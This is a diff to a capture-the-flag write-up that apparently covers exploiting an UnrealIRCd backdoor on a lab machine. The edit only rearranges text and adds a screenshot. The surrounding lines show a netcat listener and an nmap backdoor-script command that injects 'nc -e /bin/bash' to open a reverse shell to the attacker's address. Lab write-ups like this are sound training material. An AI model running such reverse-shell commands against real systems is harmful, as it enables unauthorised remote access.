@@ -60,10 +60,13 @@ nmap -d -p 6697,8067,65534 --script irc-unrealircd-backdoor 10.10.10.117
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a12d7208-05bb-4714-b634-238d41c5519a)
 
 + Start a netcat listener on the attack machine: `nc -lnvp 4444`
-+ Try to send a reverse shell to the attack machine netcat listener from the target machine. It fails, and no shell!
++ Try to send a reverse shell to the attack machine netcat listener from the target machine.
 ```
 nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.6 4444" 10.10.10.117
 ```
+
++ It fails, and no shell!
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7deaa2bd-2168-492b-b10e-0dffbcec8c6e)
 
 
 ## Gaining Access
